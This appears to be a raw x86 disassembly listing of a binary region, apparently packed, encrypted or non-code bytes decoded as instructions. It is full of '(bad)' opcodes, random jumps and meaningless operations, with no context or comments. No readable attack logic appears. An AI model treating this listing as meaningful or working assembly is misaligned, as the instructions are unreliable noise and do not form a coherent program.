  417c05:	xor    al,0x31
  417c07:	push   ds
  417c08:	or     dh,BYTE PTR [ecx+0x7d]
  417c0b:	mov    ebp,0xed2ef926
  417c10:	jnp    0x417c5b
  417c12:	jge    0x417c4b
  417c14:	xchg   BYTE PTR [edi-0x1064e79b],dl
  417c1a:	out    0x9b,al
  417c1c:	pop    edx
  417c1d:	cmp    cl,ah
  417c1f:	ficom  WORD PTR [edi-0x59]
  417c22:	sub    DWORD PTR [esi+0x2d],ebp
  417c25:	lods   eax,DWORD PTR ds:[esi]
  417c26:	inc    ecx
  417c27:	or     bl,BYTE PTR [bp+si+0x20]
  417c2b:	(bad)  
  417c2c:	loop   0x417c67
  417c2e:	mov    edi,0xc370e657
  417c33:	mov    DWORD PTR [esi-0xe467071],eax
  417c39:	push   ebx
  417c3a:	pop    ebx
  417c3b:	call   0xbe1cf45
  417c40:	into   
	...
  417cb1:	add    BYTE PTR [eax],al
  417cb3:	add    BYTE PTR [ecx],ah
  417cb5:	xchg   ebx,eax
  417cb6:	mov    DWORD PTR [edi-0x60d84045],ebp
  417cbc:	(bad)  
  417cbd:	jle    0x417d17
  417cbf:	sbb    DWORD PTR [esi],ebp
  417cc1:	loope  0x417d37
  417cc3:	xchg   DWORD PTR [edi],esi
  417cc5:	add    eax,DWORD PTR [ecx]
  417cc7:	add    ch,dh
  417cc9:	add    BYTE PTR [eax],al
  417ccb:	add    BYTE PTR [edx+edi*8+0x37f6f833],dh
  417cd2:	cmc    
  417cd3:	pop    esp
  417cd4:	cmp    BYTE PTR [ecx],bl
  417cd6:	lods   eax,DWORD PTR ds:[esi]
  417cd7:	add    eax,0xa1a73379
  417cdc:	int    0xf2
  417cde:	fidiv  WORD PTR [esi+edx*1]
  417ce1:	mov    esi,0xc912f5fa
  417ce6:	cmp    al,0xae
  417ce8:	inc    ebp
  417ce9:	sbb    esp,DWORD PTR [edx+esi*2-0x5f]
  417ced:	push   es
  417cee:	into   
  417cef:	pop    eax
  417cf0:	inc    esp
  417cf1:	inc    ecx
  417cf2:	out    dx,eax
  417cf3:	(bad)  
  417cf4:	pop    ebx
  417cf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cf6:	pop    ecx
  417cf7:	mov    cl,0x5e
  417cf9:	push   0x3f8497fe
  417cfe:	inc    edx
  417cff:	pop    eax
  417d00:	scas   al,BYTE PTR es:[edi]
  417d01:	repz and al,0x16
  417d04:	leave  
  417d05:	mov    dl,0xe8
  417d07:	xchg   ecx,eax
  417d08:	(bad)  
  417d09:	cmp    BYTE PTR [edi+0x26c8c1c6],dh
  417d0f:	cmp    ecx,DWORD PTR [esi+0x6919199c]
  417d15:	or     DWORD PTR [edx],edi
  417d17:	jle    0x417cfc
  417d19:	mov    ebx,0x7a0ada9d
  417d1e:	pop    edx
  417d1f:	fisttp DWORD PTR ss:[eax+0x2a]
  417d23:	enter  0x93b7,0x9e
  417d27:	mov    eax,0x9cb78198
  417d2c:	lock push es
  417d2e:	int3   
  417d2f:	repz fs pop ds
  417d32:	xor    BYTE PTR [ebx-0x66],0x44
  417d36:	push   ecx
  417d37:	out    dx,al
  417d38:	pop    fs
  417d3a:	repz xor BYTE PTR [edx+0x11d2d5b9],0x57
  417d42:	mov    BYTE PTR [ebp+0x5e5e5a9],dh
  417d48:	or     eax,0xc3fd4a0
  417d4d:	test   eax,0x64713c9d
  417d52:	test   DWORD PTR [esi-0x6f43f208],ebp
  417d58:	adc    al,0x25
  417d5a:	pop    ss
  417d5b:	in     eax,dx
  417d5c:	mov    ebp,0x2d098d3d
  417d61:	mov    al,0x73
  417d63:	xor    bl,BYTE PTR ds:0x50bfd090
  417d69:	xor    ah,BYTE PTR [edi+0x7c71f36]
  417d6f:	stos   DWORD PTR es:[edi],eax
  417d70:	dec    ebp
  417d71:	adc    ebx,ebp
  417d73:	push   ss
  417d74:	dec    edi
  417d75:	sar    bl,cl
  417d77:	push   DWORD PTR [eax+0x7]
  417d7a:	aad    0x39
  417d7c:	and    edi,0x31ea1afb
  417d82:	cwde   
  417d83:	sti    
  417d84:	jmp    0x3b2d1a37
  417d89:	adc    DWORD PTR [bx+si-0x5a],ecx
  417d8d:	mov    al,ds:0xd36fdc2a
  417d92:	pop    esi
  417d93:	cwde   
  417d94:	nop
  417d95:	pusha  
  417d96:	stos   BYTE PTR es:[edi],al
  417d97:	jmp    FWORD PTR [ebp-0x5c]
  417d9a:	pop    ebp
  417d9b:	and    BYTE PTR [esi+ebp*1],ch
  417d9e:	and    bh,dl
  417da0:	add    DWORD PTR [ecx+0x5],ebx
  417da3:	sub    bh,BYTE PTR [edx+ebp*8]
  417da6:	mov    eax,ebp
  417da8:	xlat   BYTE PTR ds:[ebx]
  417da9:	mov    DWORD PTR [ecx],esp
  417dab:	xchg   ebp,eax
  417dac:	shr    BYTE PTR [ebx-0x49a76bfd],1
  417db2:	mov    bh,0x81
  417db4:	cmp    cl,BYTE PTR [ebp+0x21]
  417db7:	sbb    DWORD PTR [ebp+0x1c281134],ebp
  417dbd:	inc    ecx
  417dbe:	ja     0x417d79
  417dc0:	iret   
	...
  417e31:	add    BYTE PTR [eax],al
  417e33:	add    BYTE PTR [edi-0x519271e7],bh
  417e39:	(bad)  
  417e3a:	(bad)  
  417e3b:	(bad)  
  417e3d:	xlat   BYTE PTR ds:[ebx]
  417e3e:	aam    0xef
  417e40:	shl    BYTE PTR [eax],0x14
  417e43:	pop    eax
  417e44:	sub    al,0x4
  417e46:	add    DWORD PTR [eax],eax
  417e48:	cmc    
  417e49:	add    BYTE PTR [eax],al
  417e4b:	add    BYTE PTR [esi-0x15b25933],dh
  417e51:	jnp    0x417e30
  417e53:	rcl    DWORD PTR [esi],1
  417e55:	mov    bl,0x59
  417e57:	push   edx
  417e58:	(bad)  
  417e59:	pushf  
  417e5a:	mov    ebp,0xf7429576
  417e5f:	or     BYTE PTR [edi+0x64],dl
  417e62:	jmp    0x417e00
  417e64:	inc    ecx
  417e65:	adc    bh,BYTE PTR [eax]
  417e67:	xchg   bl,bl
  417e69:	pop    es
  417e6a:	call   0x626c:0xa7bfee19
  417e71:	add    al,BYTE PTR [eax]
  417e73:	fidivr WORD PTR [edi-0x39]
  417e76:	dec    ecx
  417e77:	nop
  417e78:	icebp  
  417e79:	push   edx
  417e7a:	dec    edx
  417e7b:	into   
  417e7c:	cmp    DWORD PTR [ecx-0x5f],0xffffffd8
  417e80:	or     eax,0xbe1799ff
  417e85:	add    esi,DWORD PTR [ecx]
  417e87:	push   es
  417e88:	es (bad) 
  417e8a:	or     ebx,esi
  417e8c:	jbe    0x417ee0
  417e8e:	cmp    eax,0x30403cc1
  417e93:	xchg   edi,eax
  417e94:	dec    ecx
  417e95:	mov    esp,0xbb6583c7
  417e9a:	inc    esp
  417e9b:	popf   
  417e9c:	sub    al,0xf
  417e9f:	sahf   
  417ea0:	dec    edx
  417ea2:	xor    bh,BYTE PTR [eax-0x10]
  417ea5:	mov    cl,0x6c
  417ea7:	mov    ?,WORD PTR [ecx]
  417ea9:	loop   0x417e75
  417eab:	out    0x2c,eax
  417ead:	pop    ss
  417eae:	les    edx,FWORD PTR [ecx-0x60]
  417eb1:	push   0xffffffa9
  417eb3:	out    0xfb,al
  417eb5:	sbb    BYTE PTR [esi-0x798e307d],dl
  417ebb:	xor    eax,0xffc13d28
  417ec0:	sub    DWORD PTR [esi],0xffffffb6
  417ec3:	jns    0x417f19
  417ec5:	imul   eax,DWORD PTR [ecx],0xbed8bbe3
  417ecb:	push   ebx
  417ecc:	mov    ds,WORD PTR [esi-0x4ffba5f0]
  417ed2:	mov    ch,0x3d
  417ed4:	fmul   QWORD PTR [eax]
  417ed6:	jl     0x417eb3
  417ed8:	lock xor esp,DWORD PTR [eax]
  417edb:	mov    ds:0x706c84d1,al
  417ee0:	shl    BYTE PTR [edx],1
  417ee2:	retf   
  417ee3:	add    dh,BYTE PTR [ecx-0x2e]
  417ee6:	sub    ecx,eax
  417ee8:	fdivr  QWORD PTR [ecx-0x59]
  417eeb:	cmp    eax,0xc4fc96f2
  417ef0:	sub    dh,0xb9
  417ef3:	sbb    eax,0xdbc1bd76
  417ef8:	sbb    ch,BYTE PTR ds:0xe760252b
  417efe:	pop    ds
  417eff:	int    0x82
  417f01:	xchg   BYTE PTR [ecx],bl
  417f03:	test   al,bl
  417f05:	add    ebp,esp
  417f07:	mov    esi,0x243d8f77
  417f0c:	adc    ebx,DWORD PTR [ebp-0x4b]
  417f0f:	fimul  DWORD PTR [ecx-0x2a]
  417f12:	jbe    0x417f37
  417f14:	mov    ch,0x2a
  417f16:	push   ecx
  417f17:	push   edx
  417f18:	loop   0x417f68
  417f1a:	mov    bh,0x88
  417f1c:	(bad)  [esi+0x6e]
  417f1f:	jg     0x417f0f
  417f21:	pushf  
  417f22:	pop    ecx
  417f23:	mov    dl,0xe9
  417f25:	and    BYTE PTR [eax-0x22],bl
  417f28:	pop    ss
  417f29:	scas   al,BYTE PTR es:[edi]
  417f2a:	nop
  417f2b:	fsubr  st(1),st
  417f2d:	fidivr DWORD PTR [ecx-0x33dc228f]
  417f33:	xchg   BYTE PTR [edi-0x4d5a94ab],ah
  417f39:	addr16 sub ecx,ecx
  417f3c:	xor    al,0xf7
  417f3e:	push   esi
  417f3f:	push   ebp
  417f40:	jae    0x417f42
	...
  417fb2:	add    BYTE PTR [eax],al
  417fb4:	jbe    0x417fe3
  417fb6:	push   ebp
  417fb7:	inc    ecx
  417fb8:	pop    edi
  417fb9:	jns    0x418031
  417fbb:	aas    
  417fbc:	fisttp DWORD PTR [esi-0x68]
  417fbf:	inc    edx
  417fc0:	xchg   ebp,eax
  417fc1:	lds    ecx,FWORD PTR [edx+0x7f]
  417fc4:	and    DWORD PTR ds:0xf50001,eax
  417fca:	add    BYTE PTR [eax],al
  417fcc:	xchg   ecx,eax
  417fcd:	lahf   
  417fce:	xor    DWORD PTR [edi+0x295824b4],ebp
  417fd4:	inc    ebp
  417fd5:	dec    ecx
  417fd6:	xchg   esp,eax
  417fd7:	jae    0x417f7b
  417fd9:	ret    
  417fda:	pop    eax
  417fdb:	in     eax,dx
  417fdc:	jl     0x41804e
  417fde:	push   es
  417fdf:	(bad)  
  417fe0:	adc    BYTE PTR [ebp-0x25cddec],bh
  417fe6:	imul   ecx,DWORD PTR [eax-0x70],0x4f
  417fea:	dec    DWORD PTR [esi+eax*1-0x1a30b610]
  417ff1:	imul   eax,DWORD PTR [esi],0xffffffbb
  417ff4:	cwde   
  417ff5:	les    ebp,FWORD PTR [edx]
  417ff7:	inc    esp
  417ff8:	fwait
  417ff9:	or     DWORD PTR [edx-0x42024cbc],0x9e3a255c
  418003:	adc    al,0xe4
  418005:	inc    eax
  418006:	jno    0x418047
  418008:	sub    al,0x1
  41800a:	dec    eax
  41800b:	and    al,0xbb
  41800d:	and    al,ah
  41800f:	ret    
  418010:	aaa    
  418011:	not    cl
  418013:	repz xor cl,BYTE PTR es:[edi+0xd]
  418018:	dec    edx
  418019:	or     ch,bl
  41801b:	imul   ebp,DWORD PTR [edi-0x16],0x7de160e8
  418022:	jns    0x417ffb
  418024:	pop    edi
  418025:	add    edx,DWORD PTR [esi-0x45e4f94a]
  41802b:	ret    
  41802c:	std    
  41802d:	push   cs
  41802e:	add    bh,BYTE PTR [edx+0x15]
  418031:	inc    eax
  418032:	cs popf 
  418034:	inc    esp
  418035:	(bad)
  418038:	out    dx,al
  418039:	lahf   
  41803a:	mov    edi,0xc6a536d4
  41803f:	fistp  QWORD PTR [ebx+0x40]
  418042:	lea    eax,es:[esi]
  418045:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418046:	dec    ecx
  418047:	adc    al,0x69
  418049:	xor    DWORD PTR [ecx-0x816d445],ebp
  41804f:	sbb    edi,DWORD PTR [esi+0x6b41eb96]
  418055:	xor    dh,BYTE PTR [edx+0xb0f3574]
  41805b:	out    dx,eax
  41805c:	(bad)  
  41805d:	retf   0xe15b
  418060:	jg     0x41805a
  418062:	sahf   
  418063:	adc    al,BYTE PTR [ebp+0x43fbcfd5]
  418069:	sbb    al,0xeb
  41806b:	lods   eax,DWORD PTR ds:[esi]
  41806c:	mov    eax,ds:0xade48dca
  418071:	je     0x418023
  418073:	repnz add eax,0x66dd086
  418079:	jmp    0x32fd:0x5b2ea7b8
  418080:	aaa    
  418081:	lock xchg ebx,eax
  418083:	scas   eax,DWORD PTR es:[edi]
  418084:	mov    ebx,0x5da887d9
  418089:	inc    esp
  41808a:	pop    ds
  41808b:	out    dx,eax
  41808c:	sbb    eax,0x55ff01f8
  418091:	xor    al,0x8f
  418093:	hlt    
  418094:	and    DWORD PTR [ecx+edx*4-0x1b],esi
  418098:	xor    ecx,DWORD PTR [edi]
  41809a:	cmp    DWORD PTR [esi+0x27],esi
  41809d:	test   eax,0x977be944
  4180a2:	addr16 out dx,al
  4180a4:	repnz push esp
  4180a6:	fbstp  TBYTE PTR [edi+0x30b85d9]
  4180ac:	push   cs
  4180ad:	pop    edx
  4180ae:	ror    cl,1
  4180b0:	mov    ebp,0xb5f1ce58
  4180b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180b6:	imul   ecx,DWORD PTR [ecx],0x9a354583
  4180bc:	push   ecx
  4180bd:	cld    
  4180be:	push   es
  4180bf:	test   al,0x36
	...
  418131:	add    BYTE PTR [eax],al
  418133:	add    BYTE PTR [esi-0xe58fe7],ah
  418139:	jnp    0x418129
  41813b:	mov    ebp,0xe8ea9e45
  418140:	and    dl,dl
  418142:	mov    bl,0xda
  418144:	push   ss
  418145:	push   es
  418146:	add    DWORD PTR [eax],eax
  418148:	cmc    
  418149:	add    BYTE PTR [eax],al
  41814b:	add    BYTE PTR [edx],cl
  41814d:	(bad)  
  41814e:	cmp    al,0xc0
  418150:	cmp    bl,ah
  418152:	rol    BYTE PTR ds:0xb4cd4aa1,1
  418158:	ror    BYTE PTR [eax],cl
  41815a:	xlat   BYTE PTR ds:[ebx]
  41815b:	mov    dl,0x2b
  41815d:	lahf   
  41815e:	repnz mov ah,0xcd
  418161:	inc    edi
  418162:	mov    ss:0xcdbbb3,eax
  418168:	sbb    bl,bh
  41816a:	mov    al,ds:0xd8a1c3d8
  41816f:	or     ch,cl
  418171:	inc    ecx
  418172:	rcr    BYTE PTR [ebx-0x46068403],1
  418178:	dec    esp
  418179:	imul   ebx,DWORD PTR [ecx-0x4ff857ca],0xf
  418180:	sar    BYTE PTR ds:0x17261f9,0x5b
  418187:	jbe    0x41810a
  418189:	test   DWORD PTR [esi+ebx*4+0x65],edx
  41818d:	out    0x22,al
  41818f:	pop    ds
  418190:	cmc    
  418191:	lea    ebx,[esp+edx*4-0xa]
  418195:	imul   ecx,DWORD PTR [esi+0x6a],0xffffff9e
  418199:	cmc    
  41819a:	popf   
  41819b:	jo     0x418181
  41819d:	les    edi,FWORD PTR [ebx+0x3b814ac2]
  4181a3:	test   eax,0x31b06234
  4181a8:	mov    esp,0xd08882fb
  4181ad:	out    dx,eax
  4181ae:	dec    ecx
  4181af:	xor    bl,bh
  4181b1:	fs out 0xcc,al
  4181b4:	jmp    0xcee9f377
  4181b9:	clc    
  4181ba:	inc    ebx
  4181bb:	fucomi st,st(4)
  4181bd:	retf   0x4bda
  4181c0:	add    BYTE PTR [esi+0x4d312cbd],bh
  4181c6:	dec    eax
  4181c7:	jne    0x4181c7
  4181c9:	or     DWORD PTR [eax+0x3a],0x41b21ac9
  4181d0:	jb     0x41816b
  4181d2:	adc    ah,BYTE PTR [eax+0x504e3ac3]
  4181d8:	cmp    eax,0x14faf790
  4181dd:	xor    ah,BYTE PTR [eax+ebx*2+0x64]
  4181e1:	xor    DWORD PTR [edx+0x21],0xffffff83
  4181e5:	popa   
  4181e6:	cmc    
  4181e7:	adc    cl,BYTE PTR [eax-0x3cd9ee40]
  4181ed:	lahf   
  4181ee:	mov    ds:0x963b8227,eax
  4181f3:	sar    DWORD PTR [esi+0x4e],0x9e
  4181f7:	xchg   edi,eax
  4181f8:	sub    DWORD PTR [eax],ecx
  4181fa:	into   
  4181fb:	pushf  
  4181fc:	pop    edi
  4181fd:	lods   eax,DWORD PTR ds:[esi]
  4181fe:	sbb    cl,BYTE PTR [ecx+0x82195f8]
  418204:	cmp    al,BYTE PTR [edx-0x2]
  418207:	aas    
  418208:	or     bh,BYTE PTR [edx+0x2fec2d6f]
  41820e:	pop    ds
  41820f:	inc    edi
  418210:	mov    al,0xf5
  418212:	add    al,0xe
  418214:	mov    esi,0x5bf4e3a7
  418219:	adc    DWORD PTR [ebx],esp
  41821b:	xchg   edi,eax
  41821c:	ds scas al,BYTE PTR es:[edi]
  41821e:	(bad)  
  418220:	ret    0xf89d
  418223:	imul   esi,esi,0x486fc4e4
  418229:	sbb    ah,bh
  41822b:	js     0x418207
  41822d:	aas    
  41822e:	mov    dl,0x5f
  418230:	shl    bh,cl
  418232:	(bad)  
  418234:	sbb    eax,0x49b0f041
  418239:	push   edi
  41823a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41823b:	jno    0x4181c9
  41823d:	xchg   edi,eax
  41823e:	adc    al,BYTE PTR [esp+ebx*8+0x0]
	...
  4182b2:	add    BYTE PTR [eax],al
  4182b4:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x3ef3ecbf
  4182bf:	adc    DWORD PTR [ebp+0x30],ecx
  4182c2:	fld    DWORD PTR [ecx]
  4182c4:	or     eax,DWORD PTR [edi]
  4182c6:	add    DWORD PTR [eax],eax
  4182c8:	cmc    
  4182c9:	add    BYTE PTR [eax],al
  4182cb:	add    BYTE PTR [ecx],dl
  4182cd:	lds    ebp,FWORD PTR [esi-0x2f]
  4182d0:	repz xchg esi,eax
  4182d2:	test   eax,0x42b14bec
  4182d7:	test   al,0xf6
  4182d9:	(bad)  
  4182da:	jnp    0x418289
  4182dc:	add    ebx,eax
  4182de:	int3   
  4182df:	sub    eax,0xe81ba1
  4182e4:	int    0x8d
  4182e6:	xlat   BYTE PTR ds:[ebx]
  4182e7:	retf   0x400a
  4182ea:	mov    ds:0x3a144cb3,eax
  4182ef:	adc    eax,0xac6f54a3
  4182f4:	push   ds
  4182f5:	shl    BYTE PTR [ecx-0x63],cl
  4182f8:	jno    0x4182ef
  4182fa:	and    DWORD PTR [edi+0x18dc922d],ebp
  418300:	mov    edx,0x4dd5400a
  418305:	mov    al,ds:0x4f607e5c
  41830a:	aam    0x17
  41830c:	das    
  41830d:	inc    ebx
  41830e:	loope  0x418300
  418310:	xor    ch,bh
  418312:	jo     0x4182d7
  418314:	into   
  418315:	in     eax,dx
  418316:	mov    eax,0x60dec3b
  41831b:	cmp    ebp,DWORD PTR [edx]
  41831d:	cmp    DWORD PTR [edi-0x3c],edi
  418320:	add    DWORD PTR [edx+0x34],0x29
  418324:	adc    bh,ah
  418326:	test   eax,0x2595e96
  41832b:	sti    
  41832c:	outs   dx,BYTE PTR ds:[esi]
  41832d:	(bad)  
  41832e:	or     eax,0x8bd34d92
  418333:	pop    es
  418334:	add    eax,0xd406f070
  418339:	jmp    0x62dbef6f
  41833e:	jno    0x418398
  418340:	adc    eax,0x4849182d
  418345:	sub    ebp,esp
  418347:	cmp    bl,BYTE PTR [esi]
  418349:	xchg   DWORD PTR [esi],ebp
  41834b:	leave  
  41834c:	loop   0x4183c0
  41834e:	cmp    BYTE PTR [eax-0x70],dl
  418351:	lods   al,BYTE PTR ds:[esi]
  418352:	scas   al,BYTE PTR es:[edi]
  418353:	pop    ecx
  418354:	addr16 (bad) 
  418356:	jmp    0x2bbbab9b
  41835b:	ins    BYTE PTR es:[edi],dx
  41835c:	fisttp DWORD PTR [ebx-0x51]
  41835f:	or     eax,DWORD PTR [ecx-0x69]
  418362:	add    al,0x41
  418364:	ins    BYTE PTR es:[edi],dx
  418365:	pop    edx
  418366:	sub    cl,cl
  418368:	in     eax,dx
  418369:	dec    ebx
  41836a:	(bad)  [esi+eax*1]
  41836d:	mov    dh,0x10
  41836f:	sub    eax,DWORD PTR [bp-0x58]
  418373:	xor    BYTE PTR [ebx],cl
  418375:	mov    bh,0xe6
  418377:	jl     0x418350
  418379:	push   ds
  41837a:	cmp    eax,0xa723f6e3
  41837f:	por    mm6,QWORD PTR [ecx]
  418382:	es adc eax,0xb65d211
  418388:	aad    0x93
  41838a:	xchg   ebx,eax
  41838b:	inc    esi
  41838c:	stc    
  41838d:	je     0x4183e2
  41838f:	leave  
  418390:	jmp    0x41831d
  418392:	in     al,0x44
  418394:	ss retf 
  418396:	(bad)  
  418397:	call   0x6db3fb0f
  41839c:	xor    BYTE PTR [edi],0xcd
  41839f:	test   al,0xa8
  4183a1:	cmp    esi,edi
  4183a3:	dec    ebx
  4183a4:	and    al,0x8e
  4183a6:	int    0xbd
  4183a8:	sti    
  4183a9:	aas    
  4183aa:	or     ch,BYTE PTR [ebx+0x4]
  4183ad:	sub    eax,0xde752fed
  4183b2:	push   edx
  4183b3:	(bad)  
  4183b4:	sbb    DWORD PTR [ebp+0x4b],ebp
  4183b7:	jp     0x418366
  4183b9:	pop    edx
  4183ba:	ins    BYTE PTR es:[edi],dx
  4183bb:	push   0x94a3e11d
  4183c0:	add    BYTE PTR ds:[eax],al
	...
  418433:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  418439:	fdivr  st(7),st
  41843b:	mov    edi,0xdccd8f2d
  418440:	lock adc esp,esp
  418443:	jno    0x418445
  418445:	or     BYTE PTR [ecx],al
  418447:	add    ch,dh
  418449:	add    BYTE PTR [eax],al
  41844b:	add    BYTE PTR [eax],dh
  41844d:	test   DWORD PTR [edx+eiz*1],0x4f0f8e8c
  418454:	in     al,0x6f
  418456:	push   edi
  418457:	cmc    
  418458:	jne    0x41840d
  41845a:	ret    0x9221
  41845d:	ret    0x6086
  418460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418461:	mov    dh,0xe1
  418463:	stos   BYTE PTR es:[edi],al
  418464:	das    
  418465:	in     al,dx
  418466:	mov    al,ds:0x3d7b20e1
  41846b:	xchg   ecx,eax
  41846c:	mov    ecx,0x1a9bcbc7
  418471:	mov    ds:0x3cbba7b4,al
  418476:	dec    esi
  418477:	shr    BYTE PTR [eax-0x473cab],1
  41847d:	sbb    al,0x32
  41847f:	enter  0x35c0,0xd3
  418483:	test   ecx,edi
  418485:	jo     0x41841d
  418487:	fist   WORD PTR [ecx]
  418489:	mov    edx,0xd4fcc7f1
  41848e:	xor    BYTE PTR [edi-0x28],al
  418491:	sbb    BYTE PTR [eax+0x5b],al
  418494:	jecxz  0x418447
  418496:	gs sub eax,0x24403aa1
  41849c:	(bad)  
  41849d:	sub    BYTE PTR [ebx],dh
  41849f:	inc    ecx
  4184a0:	dec    eax
  4184a1:	mov    ch,0xd7
  4184a3:	cwde   
  4184a4:	pop    eax
  4184a5:	scas   al,BYTE PTR es:[edi]
  4184a6:	cmp    al,0xef
  4184a8:	inc    esp
  4184a9:	and    esp,eax
  4184ab:	sub    BYTE PTR [eax+0x3f],bh
  4184ae:	push   esp
  4184af:	push   ebx
  4184b0:	stc    
  4184b1:	fs (bad) 
  4184b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184b4:	mov    ecx,0x28f32efe
  4184b9:	adc    al,0x4c
  4184bb:	out    dx,al
  4184bc:	xor    eax,DWORD PTR [esi-0x6c383bb7]
  4184c2:	pop    ss
  4184c3:	call   0xc2472fdf
  4184c8:	lock pop esi
  4184ca:	dec    esp
  4184cb:	mov    eax,0xac022341
  4184d0:	test   cl,0x1b
  4184d3:	mov    BYTE PTR [ebx+eax*2-0x75],0xb5
  4184d8:	xor    BYTE PTR [esi-0x6abe5f69],al
  4184de:	adc    al,0x31
  4184e0:	add    al,0x15
  4184e2:	scas   eax,DWORD PTR es:[edi]
  4184e3:	ret    
  4184e4:	add    DWORD PTR [edi+ecx*8+0x6c],esp
  4184e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184e9:	cmp    BYTE PTR [esi],ah
  4184eb:	push   cs
  4184ec:	jmp    0xa5e8ec07
  4184f1:	aaa    
  4184f2:	jl     0x418560
  4184f4:	cdq    
  4184f5:	in     eax,0xce
  4184f7:	rcl    ah,cl
  4184f9:	imul   DWORD PTR [edi-0x4ec16a78]
  4184ff:	int    0x2d
  418501:	add    al,0x56
  418503:	push   ds
  418504:	shl    DWORD PTR [ebp+ebx*1+0xbfec3ce],cl
  41850b:	dec    ebx
  41850c:	inc    edi
  41850d:	sar    DWORD PTR [edi],cl
  41850f:	pushf  
  418510:	je     0x418555
  418512:	cwde   
  418513:	push   ss
  418514:	lea    ebp,[esi-0x1a773d05]
  41851a:	or     eax,0x42621a1a
  41851f:	stos   DWORD PTR es:[edi],eax
  418520:	adc    bh,BYTE PTR [esi+ebp*1+0x42]
  418524:	xor    al,0x32
  418526:	in     eax,0xc3
  418528:	sub    eax,0xa5a0cb1a
  41852d:	mov    ebp,0xca7b0367
  418532:	stos   BYTE PTR es:[edi],al
  418533:	repnz sbb ebp,DWORD PTR [ebx-0x45]
  418537:	in     al,dx
  418538:	int    0x39
  41853a:	cld    
  41853b:	add    DWORD PTR [esi-0xaa4c36e],esp
	...
  4185b1:	add    BYTE PTR [eax],al
  4185b3:	add    BYTE PTR [ecx-0x20b02c99],ch
  4185b9:	(bad)  
  4185ba:	mov    ebp,0x15c03be7
  4185bf:	stc    
  4185c0:	aas    
  4185c1:	sub    eax,0x8f5ba0e
  4185c6:	add    DWORD PTR [eax],eax
  4185c8:	cmc    
  4185c9:	add    BYTE PTR [eax],al
  4185cb:	add    BYTE PTR [edx-0x727067d5],al
  4185d1:	dec    esp
  4185d2:	pop    esi
  4185d3:	mov    ?,WORD PTR ds:0xb86ac4f9
  4185d9:	or     ebp,edx
  4185db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185dc:	inc    esp
  4185dd:	and    al,0xb0
  4185df:	loopne 0x41861b
  4185e1:	test   DWORD PTR [ecx],ebx
  4185e3:	test   BYTE PTR [ebx+edi*8-0x3b6ced7c],al
  4185ea:	xor    dh,ah
  4185ec:	jmp    0x1f46:0xe70b377b
  4185f3:	cwde   
  4185f4:	hlt    
  4185f5:	mov    ebx,0xd1b56f94
  4185fa:	push   ecx
  4185fb:	scas   al,BYTE PTR es:[edi]
  4185fc:	push   ds
  4185fd:	daa    
  4185fe:	lahf   
  4185ff:	cmc    
  418600:	std    
  418601:	pop    esi
  418602:	push   edi
  418603:	cli    
  418604:	cmp    DWORD PTR [ebp-0x7e617241],ebx
  41860a:	(bad)  
  41860b:	loop   0x4185b9
  41860d:	jne    0x4185b4
  41860f:	mov    BYTE PTR [eax],ah
  418611:	mov    bl,0x5c
  418613:	dec    ebp
  418614:	push   edx
  418615:	rcl    dh,1
  418617:	mov    eax,DWORD PTR [edx-0x4f]
  41861a:	iret   
  41861b:	call   0x5cfd:0xb671408d
  418622:	std    
  418623:	pop    esp
  418624:	xor    BYTE PTR [ecx],ah
  418626:	and    DWORD PTR [eax+ebx*4-0x3c],ebx
  41862a:	ret    0xb18a
  41862d:	jb     0x418649
  41862f:	pop    eax
  418630:	push   edx
  418631:	sahf   
  418632:	dec    eax
  418633:	cwde   
  418634:	adc    dl,BYTE PTR ds:0xb7bb34ea
  41863a:	inc    edx
  41863b:	jbe    0x41865b
  41863d:	adc    bl,BYTE PTR [edx]
  41863f:	jnp    0x4185c7
  418641:	jmp    0x968f6c6e
  418646:	pop    esp
  418647:	lds    edi,FWORD PTR [esp-0x5248f665]
  41864e:	into   
  41864f:	in     al,0x4f
  418651:	cs neg ebx
  418654:	add    DWORD PTR [ebx-0x5f3d8924],esi
  41865a:	sub    DWORD PTR [ecx-0x13],ecx
  41865d:	sub    BYTE PTR [esi+0x2c],dh
  418660:	mov    eax,ds:0xc0e014dd
  418665:	clc    
  418666:	dec    ebp
  418667:	ins    BYTE PTR es:[edi],dx
  418668:	sbb    DWORD PTR [ebx+0x46],esi
  41866b:	enter  0x707,0x30
  41866f:	sti    
  418670:	xchg   ebx,eax
  418671:	scas   al,BYTE PTR es:[edi]
  418672:	test   al,0x39
  418674:	jp     0x4186b5
  418676:	aam    0x40
  418678:	dec    esi
  418679:	fidivr WORD PTR ds:0xd321902e
  41867f:	dec    ecx
  418680:	data16 int 0xac
  418683:	mov    al,0x37
  418685:	addr16 iret 
  418687:	or     eax,0x99f9f195
  41868c:	test   DWORD PTR [ecx+0x5c],ecx
  41868f:	sahf   
  418690:	pop    es
  418691:	int3   
  418692:	in     eax,0x2a
  418694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418695:	scas   eax,DWORD PTR es:[edi]
  418696:	add    edx,DWORD PTR [ebx-0x23]
  418699:	adc    eax,0x248a28e
  41869e:	mov    eax,ds:0x5959155a
  4186a3:	xor    al,BYTE PTR [edx-0x52]
  4186a6:	inc    eax
  4186a7:	ss cmp eax,0x6fc407fc
  4186ad:	stos   DWORD PTR es:[edi],eax
  4186ae:	and    DWORD PTR [edi-0x55],ebx
  4186b1:	jle    0x418726
  4186b3:	fdivrp st(5),st
  4186b5:	and    eax,0xedbb7cad
  4186ba:	pop    ecx
  4186bb:	push   ss
  4186bc:	xchg   esi,eax
  4186bd:	inc    esp
  4186be:	inc    ecx
  4186bf:	ficomp DWORD PTR [ebx+0x0]
	...
  418731:	add    BYTE PTR [eax],al
  418733:	add    cl,ch
  418735:	push   cs
  418736:	(bad)  
  418737:	pop    ss
  418738:	push   edi
  41873a:	jmp    0xecc1a73d
  41873f:	sub    esp,DWORD PTR [esi+ebx*4-0x15]
  418743:	mov    esi,0x109ea
  418748:	cmc    
  418749:	add    BYTE PTR [eax],al
